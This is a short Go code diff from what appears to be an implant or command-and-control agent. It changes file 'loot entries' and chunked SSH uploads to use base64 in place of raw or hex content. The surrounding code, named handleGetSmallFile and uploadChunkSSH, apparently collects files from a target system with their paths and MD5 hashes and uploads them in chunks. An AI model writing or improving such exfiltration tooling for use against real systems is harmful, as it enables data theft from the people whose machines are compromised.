@@ -5,6 +5,7 @@ import (
 	"crypto/hmac"
 	"crypto/md5"
 	"crypto/sha256"
+	"encoding/base64"
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
@@ -595,13 +596,15 @@ func handleGetSmallFile(absPath, filename string) (string, error) {
 	hash := md5.Sum(content)
 	hashString := hex.EncodeToString(hash[:])
 
+	base64Content := base64.StdEncoding.EncodeToString(content)
+
 	// Create loot entry for the file
 	lootEntry := map[string]interface{}{
 		"type":    "file",
 		"name":    filename,
 		"path":    absPath,
 		"size":    float64(len(content)),
-		"content": string(content),
+		"content": base64Content,
 		"md5":     hashString,
 	}
 
@@ -711,7 +714,7 @@ func uploadChunkSSH(sessionID string, chunkIndex int, chunkData []byte, chunkMD5
 	chunkReq := map[string]interface{}{
 		"sessionId":  sessionID,
 		"chunkIndex": chunkIndex,
-		"chunkData":  hex.EncodeToString(chunkData),
+		"chunkData":  base64.StdEncoding.EncodeToString(chunkData),
 		"chunkMd5":   chunkMD5,
 	}
 
